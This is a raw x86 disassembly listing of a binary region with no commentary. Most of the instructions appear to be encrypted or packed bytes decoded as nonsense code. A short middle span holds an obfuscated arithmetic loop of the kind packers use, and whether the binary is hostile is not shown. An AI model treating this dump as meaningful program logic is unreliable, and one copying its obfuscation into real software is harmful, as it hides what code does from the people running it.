  411760:	outs   dx,DWORD PTR ds:[esi]
  411761:	adc    esp,ecx
  411763:	or     edx,DWORD PTR [ebp+0x11a19a07]
  411769:	loop   0x41172c
  41176b:	dec    esp
  41176c:	xchg   edi,eax
  41176d:	dec    dh
  41176f:	xor    DWORD PTR [esi-0x13],eax
  411772:	sbb    al,0x4
  411774:	sbb    ebx,DWORD PTR [ebx-0x4cae83f4]
  41177a:	rcr    eax,cl
  41177c:	imul   ebp,DWORD PTR [ecx-0x75],0x2e
  411780:	jmp    0x4117bf
  411782:	xor    ebx,DWORD PTR [ecx+0x398495f9]
  411788:	inc    ecx
  411789:	or     DWORD PTR [edx+0x22],ebp
  41178c:	std    
  41178d:	lods   eax,DWORD PTR ds:[esi]
  41178e:	test   al,0xe
  411790:	jne    0x41172a
  411792:	jno    0x4117cd
  411794:	push   edx
  411795:	pop    edx
  411796:	imul   esp,eax,0x9d934dd5
  41179c:	loop   0x4117a9
  41179e:	cmp    eax,0x5b63b465
  4117a3:	cs iret 
  4117a5:	mov    edx,0xd1955c68
  4117aa:	adc    DWORD PTR [bx+si+0x2],ebx
  4117ae:	inc    esp
  4117af:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  4117b1:	sub    eax,0xa7519c17
  4117b6:	test   dh,dh
  4117b8:	les    edi,FWORD PTR [edx-0x6a642919]
  4117be:	into   
  4117bf:	cs pop esp
  4117c1:	dec    ebx
  4117c2:	popa   
  4117c3:	mov    ebx,0xec033041
  4117c8:	pusha  
  4117c9:	sub    BYTE PTR [edx-0x57451faf],ch
  4117cf:	test   al,0x5
  4117d1:	push   eax
  4117d2:	push   0xa9ec3664
  4117d7:	inc    edx
  4117d8:	lods   eax,DWORD PTR ds:[esi]
  4117d9:	adc    ah,BYTE PTR [ecx-0x74654240]
  4117df:	mov    eax,ds:0x6ee8b675
  4117e4:	or     BYTE PTR [ebx-0x12cf1791],cl
  4117ea:	faddp  st(7),st
  4117ec:	xchg   esi,eax
  4117ed:	out    0x3a,eax
  4117ef:	scas   eax,DWORD PTR es:[edi]
  4117f0:	xor    dh,BYTE PTR [ebx-0x4bbf67bf]
  4117f6:	inc    ebp
  4117f8:	jae    0x411828
  4117fa:	mov    DWORD PTR fs:[ecx+0x47],ebx
  4117fe:	mov    dh,0x19
  411800:	cld    
  411801:	cmp    BYTE PTR [esi-0x174ec062],al
  411807:	fwait
  411808:	cwde   
  411809:	dec    ecx
  41180a:	jl     0x411815
  41180c:	ror    BYTE PTR [edx],1
  41180e:	jb     0x41188a
  411810:	add    ah,ch
  411812:	inc    esp
  411813:	sub    al,0x44
  411815:	arpl   WORD PTR [eax+0x5f],dx
  411818:	lods   eax,DWORD PTR ds:[esi]
  411819:	adc    DWORD PTR [esi-0x6fd53e84],0xf740c1e4
  411823:	sbb    eax,0xcf6c45a3
  411828:	fwait
  411829:	or     ebp,0x25ebdbfc
  41182f:	retf   0x8aa7
  411832:	jp     0x411815
  411834:	mov    bl,BYTE PTR [ebx-0x56de1a83]
  41183a:	mov    edi,0x4d1daf50
  41183f:	jb     0x41188e
  411841:	pop    edi
  411842:	push   ecx
  411843:	fldenv cs:[esi+eiz*4-0x3a]
  411848:	xor    DWORD PTR [eax],ebx
  41184a:	dec    edx
  41184b:	sub    BYTE PTR es:[eax-0xad1c7e4],ah
  411852:	xor    bl,0x99
  411855:	fwait
  411856:	cmp    DWORD PTR [ecx],esi
  411858:	and    DWORD PTR [ebp+0x6f],ebx
  41185b:	mov    DWORD PTR [eax-0x4b],ecx
  41185e:	es ret 
  411860:	jnp    0x4117ee
  411862:	mov    ch,0x5b
  411864:	nop
  411865:	test   BYTE PTR [eax],0x3d
  411868:	mov    ch,0x1
  41186a:	add    eax,0x260a9bc7
  41186f:	jmp    0xa281:0xcd76c7bb
  411876:	mov    eax,0x31c7ba90
  41187b:	mov    edx,0x4a0d0ca6
  411880:	jmp    0x4118db
  411882:	inc    esi
  411883:	xchg   esi,eax
  411884:	cmp    al,0x1
  411886:	adc    DWORD PTR es:[ebx+0x222b1949],esp
  41188d:	fstp   TBYTE PTR [edi+edx*2+0x5da6911b]
  411894:	stc    
  411895:	outs   dx,BYTE PTR ds:[esi]
  411896:	loope  0x4118e1
  411898:	and    ebp,DWORD PTR [esi-0x7f5bd84e]
  41189e:	js     0x411886
  4118a0:	out    0x3c,eax
  4118a2:	cld    
  4118a3:	pop    esi
  4118a4:	in     eax,dx
  4118a5:	push   ecx
  4118a6:	cmp    al,0x79
  4118a8:	cmp    DWORD PTR [ecx],esp
  4118aa:	ins    BYTE PTR es:[edi],dx
  4118ab:	jg     0x41191c
  4118ad:	data16 mov dh,0xb2
  4118b0:	inc    edx
  4118b1:	div    BYTE PTR [ebx+0x710ef5b8]
  4118b7:	xor    DWORD PTR [ecx],0x499644f1
  4118bd:	jns    0x4118c4
  4118bf:	mov    ch,0x8e
  4118c1:	ret    
  4118c2:	ja     0x41190a
  4118c4:	adc    BYTE PTR [ebp+0x51],0xe3
  4118c8:	inc    edx
  4118c9:	cs aad 0x62
  4118cc:	xchg   ecx,eax
  4118cd:	je     0xeaca9b8f
  4118d3:	sti    
  4118d4:	sbb    eax,0xbdcfc373
  4118d9:	or     bh,BYTE PTR [ebp+0x72f8f639]
  4118df:	jg     0x4118a4
  4118e1:	adc    BYTE PTR [edi+0x79ee3929],bh
  4118e7:	pop    edx
  4118e8:	call   0xee95:0xa8bb2d14
  4118ef:	xchg   ebx,eax
  4118f0:	mov    ecx,0x482d8968
  4118f5:	or     esi,edx
  4118f7:	sub    DWORD PTR [eax+0x5f],esp
  4118fa:	mov    ds:0x2b31e89a,eax
  4118ff:	pop    edx
  411900:	test   BYTE PTR [edi],dh
  411902:	adc    esi,DWORD PTR [esi-0x1c]
  411905:	(bad)  
  411906:	fcom   DWORD PTR [eax]
  411908:	adc    eax,0x3d69ecef
  41190d:	pop    ebx
  41190e:	cmp    al,0xb3
  411910:	mov    eax,0x485c9680
  411915:	xchg   ecx,eax
  411916:	mov    BYTE PTR [edx],ch
  411918:	gs mov bl,0x9
  41191b:	outs   dx,BYTE PTR ds:[esi]
  41191c:	or     al,0x83
  41191e:	(bad)  
  411920:	mov    ds,WORD PTR [ebp-0xf]
  411923:	aaa    
  411924:	(bad)  
  411925:	out    0x2a,al
  411927:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411929:	inc    eax
  41192a:	aad    0x23
  41192c:	iret   
  41192d:	xchg   edx,eax
  41192e:	pop    ebx
  41192f:	jns    0x411973
  411931:	inc    ebx
  411932:	aas    
  411933:	push   edx
  411934:	and    ebx,ebp
  411936:	sti    
  411937:	mov    bh,0xf6
  411939:	stc    
  41193a:	fdiv   QWORD PTR [eax]
  41193c:	es (bad) 
  41193e:	or     edx,ecx
  411940:	mov    edx,ebp
  411942:	pop    ds
  411943:	and    eax,0x6f1a25fe
  411948:	cdq    
  411949:	xchg   esp,eax
  41194a:	and    ch,BYTE PTR [ebx+0x62]
  41194d:	mov    eax,ds:0xcff930fd
  411952:	loope  0x4119ab
  411954:	bound  edx,QWORD PTR [esi]
  411956:	jecxz  0x411944
  411958:	cmc    
  411959:	clc    
  41195a:	pop    edi
  41195b:	je     0x4119a0
  41195d:	enter  0xd207,0x77
  411961:	jb     0x4119af
  411963:	jne    0x41197b
  411965:	stc    
  411966:	inc    esp
  411967:	push   esi
  411968:	popa   
  411969:	mov    ah,0x6a
  41196b:	dec    edi
  41196c:	int    0xf7
  41196e:	sub    BYTE PTR [esi-0x461ade8d],ch
  411974:	pop    ds
  411975:	jle    0x411914
  411977:	or     al,0x34
  411979:	call   0xe322:0x1f4b314b
  411980:	push   edx
  411981:	cmp    eax,0x696454aa
  411986:	(bad)  
  411987:	jl     0x411990
  411989:	ret    
  41198a:	mov    ds:0x27f58166,al
  41198f:	pop    esi
  411990:	xchg   esp,eax
  411991:	mov    bl,ah
  411993:	hlt    
  411994:	pop    ecx
  411995:	(bad)  
  411996:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411997:	push   esi
  411998:	lock inc esi
  41199a:	xor    ch,bl
  41199c:	jmp    0x411945
  41199e:	and    esi,DWORD PTR [eax-0x4163aa80]
  4119a4:	inc    ecx
  4119a5:	inc    esi
  4119a6:	(bad)  
  4119a7:	in     eax,0x80
  4119a9:	adc    BYTE PTR [ebx-0x66],dh
  4119ac:	clc    
  4119ad:	mov    edx,edx
  4119af:	out    dx,al
  4119b0:	xor    eax,0xf5d5e172
  4119b5:	fcomp  st(1)
  4119b7:	ja     0x4119ab
  4119b9:	adc    esi,esp
  4119bb:	pop    eax
  4119bc:	dec    ecx
  4119bd:	or     edx,DWORD PTR [edi]
  4119bf:	ret    0x1e43
  4119c2:	ret    
  4119c3:	pop    esp
  4119c4:	das    
  4119c5:	add    BYTE PTR [ecx],bl
  4119c7:	aaa    
  4119c8:	mov    edi,0x3b73de4b
  4119cd:	mov    ch,0x9
  4119cf:	push   0x2c
  4119d1:	xchg   esp,eax
  4119d2:	dec    edi
  4119d3:	ja     0x411967
  4119d5:	aad    0x9a
  4119d7:	dec    edi
  4119d8:	scas   eax,DWORD PTR es:[edi]
  4119d9:	dec    eax
  4119da:	in     al,dx
  4119db:	adc    eax,0xbb19a563
  4119e0:	xchg   esp,eax
  4119e1:	mov    ebp,0x575392d5
  4119e6:	xor    esi,DWORD PTR [edx+0x22b0ead2]
  4119ec:	out    0xf8,al
  4119ee:	mov    DWORD PTR [ebx+0x7f],ecx
  4119f1:	imul   edx,DWORD PTR [ebp+0x1b],0xfffffffb
  4119f5:	retf   
  4119f6:	dec    ebx
  4119f7:	call   0x73ca:0xc4d6f4e7
  4119fe:	or     DWORD PTR [esi+0x12],ecx
  411a01:	pop    edx
  411a02:	xchg   ebx,eax
  411a03:	cmp    eax,0x627e08ee
  411a08:	xchg   ebp,eax
  411a09:	mov    bh,0xaa
  411a0b:	rol    edi,cl
  411a0d:	pop    ebx
  411a0e:	mov    al,0x5
  411a10:	xchg   ebx,eax
  411a11:	retf   
  411a12:	pop    esi
  411a13:	or     ebx,0x516acc0d
  411a19:	jmp    0x411a5a
  411a1b:	dec    edi
  411a1c:	fs in  al,0x27
  411a1f:	sbb    ecx,DWORD PTR [edx+0x6f]
  411a22:	mov    bh,0x5c
  411a24:	mov    ds:0xfcd38d87,al
  411a29:	sti    
  411a2a:	inc    edi
  411a2b:	push   ecx
  411a2c:	pop    ss
  411a2d:	jmp    edx
  411a2f:	btr    DWORD PTR [edi-0x5],edx
  411a33:	mov    al,0x58
  411a35:	cmp    al,0x29
  411a37:	xor    edx,esi
  411a39:	in     eax,0x4f
  411a3b:	out    0x54,eax
  411a3d:	loope  0x411a8f
  411a3f:	cmp    esi,DWORD PTR [edi+0x3ae0a1eb]
  411a45:	or     esp,ecx
  411a47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411a48:	fisttp WORD PTR [eax+0x7a]
  411a4b:	ret    0x3397
  411a4e:	test   eax,0xf50895fe
  411a53:	ss ret 
  411a55:	pop    esi
  411a56:	fwait
  411a57:	int3   
  411a58:	pop    es
  411a59:	nop
  411a5a:	sbb    al,0xfa
  411a5c:	mov    ds:0xb1535706,al
  411a61:	pop    esi
  411a62:	ret    
  411a63:	iret   
  411a64:	sub    eax,0xdb92fa95
  411a69:	pop    ecx
  411a6a:	adc    al,0x85
  411a6c:	out    dx,al
  411a6d:	mov    WORD PTR [edi],?
  411a6f:	out    0x7a,eax
  411a71:	ins    DWORD PTR es:[edi],dx
  411a72:	es pop ebp
  411a74:	mov    edi,0xef91cf5c
  411a79:	pop    es
  411a7a:	push   ebp
  411a7b:	xor    DWORD PTR [edx+0x49],ebx
  411a7e:	stc    
  411a7f:	pop    ecx
  411a80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a81:	cmp    esp,DWORD PTR [ebx+0x1d78ca32]
  411a87:	jo     0x411a37
  411a89:	mov    ch,0x7e
  411a8b:	sbb    DWORD PTR [edx+0x47],ecx
  411a8e:	inc    edi
  411a8f:	dec    esp
  411a90:	loop   0x411a5f
  411a92:	shl    DWORD PTR [esi],1
  411a94:	inc    ebx
  411a95:	mov    edi,0x948b99f5
  411a9a:	fcom   QWORD PTR [esi]
  411a9c:	imul   esp,ebp,0xffffffc0
  411a9f:	call   0x1987:0xcdf16b38
  411aa6:	bound  edi,QWORD PTR [eax+0x558b2d93]
  411aac:	call   0xd644eae4
  411ab1:	cmp    ecx,edx
  411ab3:	mov    ecx,DWORD PTR [ebp-0x14]
  411ab6:	mov    DWORD PTR [ebp+0x8],ecx
  411ab9:	mov    ecx,DWORD PTR [ebp+0x8]
  411abc:	je     0x4164f7
  411ac2:	xor    ecx,eax
  411ac4:	add    ecx,esi
  411ac6:	mov    ecx,0x242ebe9
  411acb:	je     0x411bdb
  411ad1:	mov    edx,DWORD PTR [ebp+0x8]
  411ad4:	mov    ebx,DWORD PTR [ebp-0x8]
  411ad7:	xor    edx,eax
  411ad9:	xor    ebx,eax
  411adb:	sub    edx,ebx
  411add:	sub    edx,esi
  411adf:	xor    edx,eax
  411ae1:	mov    DWORD PTR [ebp+0x8],edx
  411ae4:	mov    edx,DWORD PTR [ebp+0x8]
  411ae7:	mov    ebx,DWORD PTR [ebp-0x58]
  411aea:	add    edx,0x5708c4
  411af0:	imul   edx,ebx
  411af3:	mov    DWORD PTR [ebp-0x58],edx
  411af6:	mov    edx,DWORD PTR [ebp+0x8]
  411af9:	mov    ebx,DWORD PTR [ebp-0x54]
  411afc:	add    edx,0x64f8da
  411b02:	or     edx,ebx
  411b04:	mov    DWORD PTR [ebp-0x54],edx
  411b07:	mov    edx,DWORD PTR [ebp+0x8]
  411b0a:	mov    ebx,DWORD PTR [ebp-0x50]
  411b0d:	add    edx,ecx
  411b0f:	xor    edx,ebx
  411b11:	mov    DWORD PTR [ebp-0x50],edx
  411b14:	mov    edx,DWORD PTR [ebp+0x8]
  411b17:	mov    ebx,DWORD PTR [ebp-0x4c]
  411b1a:	add    edx,edi
  411b1c:	and    edx,ebx
  411b1e:	mov    DWORD PTR [ebp-0x4c],edx
  411b21:	mov    edx,DWORD PTR [ebp+0x8]
  411b24:	mov    ebx,DWORD PTR [ebp-0x48]
  411b27:	lea    edx,[ebx+edx*1+0x241fc1f]
  411b2e:	mov    DWORD PTR [ebp-0x48],edx
  411b31:	mov    edx,DWORD PTR [ebp+0x8]
  411b34:	mov    ebx,0xfa5e15e2
  411b39:	sub    ebx,edx
  411b3b:	add    ebx,DWORD PTR [ebp-0x44]
  411b3e:	mov    DWORD PTR [ebp-0x44],ebx
  411b41:	mov    edx,DWORD PTR [ebp+0x8]
  411b44:	xor    edx,eax
  411b46:	add    edx,esi
  411b48:	jne    0x411ad1
  411b4e:	jmp    0x411bdb
  411b53:	mov    edx,DWORD PTR [ebp-0x14]
  411b56:	mov    DWORD PTR [ebp+0x8],edx
  411b59:	jmp    0x411bce
  411b5e:	mov    edx,DWORD PTR [ebp+0x8]
  411b61:	mov    ebx,DWORD PTR [ebp-0x8]
  411b64:	xor    edx,eax
  411b66:	xor    ebx,eax
  411b68:	sub    edx,ebx
  411b6a:	sub    edx,esi
  411b6c:	xor    edx,eax
  411b6e:	mov    DWORD PTR [ebp+0x8],edx
  411b71:	mov    edx,DWORD PTR [ebp+0x8]
  411b74:	mov    ebx,DWORD PTR [ebp-0x58]
  411b77:	add    edx,0x5708c4
  411b7d:	imul   edx,ebx
  411b80:	mov    DWORD PTR [ebp-0x58],edx
  411b83:	mov    edx,DWORD PTR [ebp+0x8]
  411b86:	mov    ebx,DWORD PTR [ebp-0x54]
  411b89:	add    edx,0x64f8da
  411b8f:	or     edx,ebx
  411b91:	mov    DWORD PTR [ebp-0x54],edx
  411b94:	mov    edx,DWORD PTR [ebp+0x8]
  411b97:	mov    ebx,DWORD PTR [ebp-0x50]
  411b9a:	add    edx,ecx
  411b9c:	xor    edx,ebx
  411b9e:	mov    DWORD PTR [ebp-0x50],edx
  411ba1:	mov    edx,DWORD PTR [ebp+0x8]
  411ba4:	mov    ebx,DWORD PTR [ebp-0x4c]
  411ba7:	add    edx,edi
  411ba9:	and    edx,ebx
  411bab:	mov    DWORD PTR [ebp-0x4c],edx
  411bae:	mov    edx,DWORD PTR [ebp+0x8]
  411bb1:	mov    ebx,DWORD PTR [ebp-0x48]
  411bb4:	lea    edx,[ebx+edx*1+0x241fc1f]
  411bbb:	mov    DWORD PTR [ebp-0x48],edx
  411bbe:	mov    edx,DWORD PTR [ebp+0x8]
  411bc1:	mov    ebx,0xfa5e15e2
  411bc6:	sub    ebx,edx
  411bc8:	add    ebx,DWORD PTR [ebp-0x44]
  411bcb:	mov    DWORD PTR [ebp-0x44],ebx
  411bce:	mov    edx,DWORD PTR [ebp+0x8]
  411bd1:	xor    edx,eax
  411bd3:	add    edx,esi
  411bd5:	jne    0x411b5e
  411bdb:	mov    edx,DWORD PTR [ebp-0x14]
  411bde:	mov    DWORD PTR [ebp+0x8],edx
  411be1:	jmp    0x4163be
  411be6:	jmp    0x413f9a
  411beb:	rcr    BYTE PTR [ecx-0x6f],1
  411bee:	and    BYTE PTR [ecx+0x70],dh
  411bf1:	ror    DWORD PTR [ecx+0x1e6f5998],1
  411bf7:	fist   WORD PTR [eax-0x56b4837d]
  411bfd:	jl     0x411c7b
  411bff:	jmp    0x411c60
  411c01:	jl     0x411c7f
  411c03:	into   
  411c04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411c05:	xchg   ebp,eax
  411c06:	adc    eax,DWORD PTR [eax]
  411c08:	xor    esi,DWORD PTR [edi+0x1c]
  411c0b:	popa   
  411c0c:	inc    edi
  411c0d:	sbb    ch,BYTE PTR [esi]
  411c0f:	jl     0x411c03
  411c11:	mov    edx,0x63b671cd
  411c16:	adc    BYTE PTR [eax-0x15dad967],al
  411c1c:	aam    0x65
  411c1e:	sbb    bl,BYTE PTR [edi]
  411c20:	mov    al,ds:0x81fe2d96
  411c25:	rcr    edi,0x60
  411c28:	pop    esi
  411c29:	add    DWORD PTR ss:[eax],edx
  411c2c:	fwait
  411c2d:	xchg   ebx,eax
  411c2e:	aas    
  411c2f:	ret    0xe788
  411c32:	mov    edi,gs
  411c34:	stos   DWORD PTR es:[edi],eax
  411c35:	jmp    0x411c0a
  411c37:	xchg   cl,al
  411c39:	leave  
  411c3a:	jmp    DWORD PTR [edi-0x31b9c596]
  411c40:	outs   dx,DWORD PTR ds:[esi]
  411c41:	jge    0x411c3c
  411c43:	pop    edi
  411c44:	loop   0x411c51
  411c46:	test   BYTE PTR [ecx],ah
  411c48:	xchg   BYTE PTR [ebx+ebx*8],al
  411c4b:	add    DWORD PTR [ebp-0x20],0xffffff87
  411c4f:	imul   esp,edi,0xc0ca3c6c
  411c55:	out    0x1f,al
  411c57:	outs   dx,DWORD PTR ds:[esi]
  411c58:	neg    eax
  411c5a:	xchg   edi,eax
  411c5b:	adc    bh,BYTE PTR ds:0x94b23c62
  411c61:	repnz fwait
  411c63:	mov    dh,0x7d
  411c65:	xor    al,0xc8
  411c67:	dec    esi
  411c68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411c69:	sbb    esi,DWORD PTR [eax+0x3d31877]
  411c6f:	inc    ebx
  411c70:	sub    eax,0xe0eea4d4
  411c75:	and    BYTE PTR [eax+0x428ffdd7],bl
  411c7b:	in     eax,0x18
  411c7d:	and    bh,BYTE PTR [edi]
  411c7f:	pop    edi
  411c80:	push   edi
  411c81:	jne    0x411cc7
  411c83:	mov    gs,WORD PTR gs:[esi-0x55]
  411c87:	xor    ah,bh
  411c89:	sub    ebp,DWORD PTR [edi+0x75315e4b]
  411c8f:	mov    al,0x6d
  411c91:	jo     0x411c18
  411c93:	jo     0xdd3568c7
  411c99:	xor    bl,cl
  411c9b:	sbb    eax,0x20f72af1
  411ca0:	or     DWORD PTR [esi+0x2],eax
  411ca3:	add    BYTE PTR [ecx-0x7b],bh
  411ca6:	dec    edx
  411ca7:	pop    ds
  411ca8:	dec    esp
  411ca9:	nop
  411caa:	ret    
  411cab:	stos   DWORD PTR es:[edi],eax
  411cac:	mov    bl,0x33
  411cae:	pop    ss
  411caf:	test   DWORD PTR [ebp+0x38],edi
  411cb2:	pushf  
  411cb3:	xor    edx,DWORD PTR [edx-0x9]
  411cb6:	neg    DWORD PTR [ebx+0x18e74f11]
  411cbc:	shl    DWORD PTR [edi-0xae97e31],0x4d
  411cc3:	add    dh,BYTE PTR [esi+0x1c86df80]
  411cc9:	sub    DWORD PTR [ebx+0x5822e340],edi
  411ccf:	scas   eax,DWORD PTR es:[edi]
  411cd0:	adc    eax,0xee08d1a3
  411cd5:	mov    bl,0xc4
  411cd7:	and    esi,DWORD PTR [esi]
  411cd9:	(bad)  
  411cda:	adc    cl,BYTE PTR [edx+edi*2+0x1761ccd6]
  411ce1:	sti    
  411ce2:	(bad)  
  411ce3:	imul   esi,DWORD PTR [ecx-0x5e],0xf
  411ce7:	lods   al,BYTE PTR ds:[esi]
  411ce8:	cmc    
  411ce9:	call   0x9827407a
  411cee:	nop
  411cef:	popa   
  411cf0:	and    bl,dl
  411cf2:	ss push 0x5d408ed7
  411cf8:	jg     0x411cd4
  411cfa:	mov    eax,ds:0xcf5e7af2
  411cff:	lock gs aaa 
  411d02:	xchg   BYTE PTR [edi+0x386a683],dl
  411d08:	mov    ds:0x32218cb1,al
  411d0d:	imul   ecx,DWORD PTR [ebp+0x221eb6de],0x1711f2a6
  411d17:	jbe    0x411d72
  411d19:	jmp    0xc967:0xeb57fdce
  411d20:	push   eax
  411d21:	sub    DWORD PTR [ecx-0x2f],ecx
  411d24:	push   ds
  411d25:	mov    al,0x72
  411d27:	ja     0x411d01
  411d29:	out    0x72,eax
  411d2b:	push   edi
  411d2c:	cvttps2pi mm5,QWORD PTR ds:0xc62db772
  411d33:	xor    dl,BYTE PTR [ebp+0x3332e53b]
  411d39:	repnz mov dl,0x0
  411d3c:	out    0x6b,eax
  411d3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d3f:	pop    edx
  411d40:	mul    BYTE PTR [edi-0x43169a28]
  411d46:	stc    
  411d47:	lds    edi,FWORD PTR [edi+0x1b]
  411d4a:	shr    ecx,0x2a
  411d4d:	xor    esp,DWORD PTR [eax+0x7d]
  411d50:	repnz sbb al,0x62
  411d53:	xchg   esp,eax
  411d54:	mov    ebp,0xd6dc2d44
  411d59:	test   DWORD PTR [edi-0x5376dc91],0x97462a85
  411d63:	jl     0x411dba
  411d65:	cwde   
  411d66:	retf   
  411d67:	popa   
  411d68:	(bad)  
  411d69:	cmp    cl,ah
  411d6b:	xchg   esp,eax
  411d6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411d6d:	pop    eax
  411d6e:	hlt    
  411d6f:	stos   DWORD PTR es:[edi],eax
  411d70:	cmp    BYTE PTR [ecx-0x1a23035b],ch
  411d76:	cmp    DWORD PTR [ecx],edx
  411d78:	sar    BYTE PTR [esi+0x5550e598],cl
  411d7e:	retf   
  411d7f:	mov    edi,0xf7bad40a
  411d84:	push   eax
  411d85:	jo     0x411dec
  411d87:	cli    
  411d88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411d89:	adc    BYTE PTR [ecx],bl
  411d8b:	push   ecx
  411d8c:	ds sbb bl,dl
  411d8f:	mov    eax,ds:0xc42baf37
  411d94:	xor    dl,0x16
  411d97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d98:	jl     0x411d47
  411d9a:	cwde   
  411d9b:	inc    edi
  411d9c:	nop
  411d9d:	ja     0x411dde
  411d9f:	and    BYTE PTR [eax+0x32f2f84],ah
  411da5:	call   0x5699:0x591d39e8
  411dac:	iret   
  411dad:	gs nop
  411daf:	or     eax,0x27f7a1da
  411db4:	or     cl,BYTE PTR [eax-0x71]
  411db7:	out    0xd,al
  411db9:	add    ch,BYTE PTR [ebx]
  411dbb:	adc    DWORD PTR [eax-0x424342e5],eax
  411dc1:	inc    ebx
  411dc2:	push   esp
  411dc3:	test   BYTE PTR [edi+ebp*2+0x31],bl
  411dc7:	data16 out dx,al
  411dc9:	mov    ebx,0xf3b0c2bb
  411dce:	stos   BYTE PTR es:[edi],al
  411dcf:	je     0x411e1a
  411dd1:	sbb    eax,0x2956377c
  411dd6:	outs   dx,DWORD PTR ds:[esi]
  411dd7:	ds push edx
  411dd9:	push   ss
  411dda:	stc    
  411ddb:	lds    ecx,FWORD PTR [esi]
  411ddd:	mov    ah,0x14
  411ddf:	xchg   edx,eax
  411de0:	fldenv [ecx-0x765b417b]
  411de6:	add    eax,0x27eb7122
  411deb:	pmulhw mm3,QWORD PTR [eax]
  411dee:	push   cs
  411def:	rol    DWORD PTR [edi-0x1ecf15d7],1
  411df5:	out    0x31,al
  411df7:	lds    ebp,FWORD PTR [edi]
  411df9:	xchg   edi,eax
  411dfa:	fisttp WORD PTR [esi+0x1532d16]
  411e00:	popf   
  411e01:	rol    cl,1
  411e03:	xchg   ecx,eax
  411e04:	or     ebx,DWORD PTR [ebp+0x6a]
  411e07:	pushf  
  411e08:	add    BYTE PTR [eax-0x608e5c0],bh
  411e0e:	pop    ebp
  411e0f:	and    al,0x7e
  411e11:	mov    edx,0x6a69d9e7
  411e16:	xchg   DWORD PTR [ebp-0x3a],ebx
  411e19:	push   esi
  411e1a:	or     eax,0x5b8af2f5
  411e1f:	sbb    dh,BYTE PTR [eax+0x48196df0]
  411e25:	imul   esp,DWORD PTR [edx],0xfb449a5
  411e2b:	pop    es
  411e2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e2d:	test   esi,eax
  411e2f:	scas   eax,DWORD PTR es:[edi]
  411e30:	push   cs
  411e31:	lods   al,BYTE PTR ds:[esi]
  411e32:	sub    ah,BYTE PTR [edi-0x10643dd2]
  411e38:	call   0x8cde:0x5b60c5de
  411e3f:	loopne 0x411eb7
  411e41:	inc    ecx
  411e42:	out    0x36,al
  411e44:	or     eax,edi
  411e46:	add    esp,DWORD PTR [ebx+0x5d]
  411e49:	addr16 cmc 
  411e4b:	jb     0x411e09
  411e4d:	rol    DWORD PTR [ebx+edi*1-0x79],1
  411e51:	sbb    DWORD PTR [edx-0x68],edi
  411e54:	mov    dh,BYTE PTR [edi-0x3849d725]
  411e5a:	out    dx,al
  411e5b:	fisttp QWORD PTR [ecx]
  411e5d:	jo     0x411de6
  411e5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e60:	aaa    
  411e61:	add    eax,0xc9067026
  411e66:	daa    
  411e67:	mov    eax,0x7125b1c9
  411e6c:	(bad)  
  411e6e:	pusha  
  411e6f:	popa   
  411e70:	pop    eax
  411e71:	cmp    DWORD PTR ss:[ecx-0x3a],ecx
  411e75:	lods   al,BYTE PTR ds:[esi]
  411e76:	lods   eax,DWORD PTR ds:[esi]
  411e77:	mov    ds:0x8193f219,al
  411e7c:	pop    ebx
  411e7d:	cs iret 
  411e7f:	rcr    DWORD PTR [ecx-0x6a],0x1
  411e83:	shr    DWORD PTR [esi+eax*8+0x7eda2330],cl
  411e8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e8b:	(bad)  
  411e8c:	daa    
  411e8d:	(bad)  
  411e8f:	hlt    
  411e90:	fimul  DWORD PTR [edi]
  411e92:	bound  edx,QWORD PTR [ebx-0x64]
  411e95:	adc    ecx,DWORD PTR [esi+0x6ee38d9d]
  411e9b:	das    
  411e9c:	dec    edi
  411e9d:	and    eax,0x5dd231a9
  411ea2:	and    BYTE PTR [edx],ch
  411ea4:	out    dx,al
  411ea5:	fdiv   st(7),st
  411ea7:	push   esp
  411ea8:	cwde   
  411ea9:	cli    
  411eaa:	popa   
  411eab:	les    ebx,FWORD PTR [esi+0x73]
  411eae:	xor    ch,BYTE PTR [eax+eax*4+0x415c1ce3]
  411eb5:	(bad)  
  411eb6:	sub    eax,0x2650a524
  411ebb:	xchg   DWORD PTR [ebx+0x17],eax
  411ebe:	push   0xffffffde
  411ec0:	scas   al,BYTE PTR es:[edi]
  411ec1:	mov    bl,0x30
  411ec3:	call   0xd1a:0x2a7682b9
  411eca:	ss jle 0x411e9c
  411ecd:	push   ds
  411ece:	lock sub DWORD PTR [eax-0x41],edx
  411ed2:	hlt    
  411ed3:	sbb    ch,ah
  411ed5:	mov    ebx,0xb35c9068
  411eda:	mov    ch,cl
  411edc:	fstp   DWORD PTR [ecx]
  411ede:	(bad)  
  411ee0:	in     al,dx
  411ee1:	cs sbb ebx,edx
  411ee4:	sub    BYTE PTR [edx-0x37a0b266],dl
  411eea:	(bad)  
  411eeb:	sub    eax,0xeca8754e
  411ef0:	scas   eax,DWORD PTR es:[edi]
  411ef1:	test   ecx,esp
  411ef3:	xor    ch,BYTE PTR [ebp-0x7798846a]
  411ef9:	pop    edx
  411efa:	mov    edi,0xa9479eeb
  411eff:	add    edx,DWORD PTR [eax]
  411f01:	iret   
  411f02:	adc    al,0x24
  411f04:	inc    edx
  411f05:	ss mov edi,0xe6214b71
  411f0b:	cmp    al,0x3d
  411f0d:	cmp    DWORD PTR [ecx],eax
  411f0f:	ins    BYTE PTR es:[edi],dx
  411f10:	dec    esi
  411f11:	jle    0x411f8f
  411f13:	mov    ch,0x17
  411f15:	mov    ?,WORD PTR [esp+edx*8+0x32]
  411f19:	not    DWORD PTR [ebp+0x6e293fd6]
  411f1f:	mov    cl,0xfb
  411f21:	lods   al,BYTE PTR ds:[esi]
  411f22:	or     bh,BYTE PTR [edx+0x89064c1]
  411f28:	daa    
  411f29:	mov    al,0xec
  411f2b:	cmp    eax,0x6bc954c5
  411f30:	xor    DWORD PTR ds:[esp+ecx*2-0x73],ebx
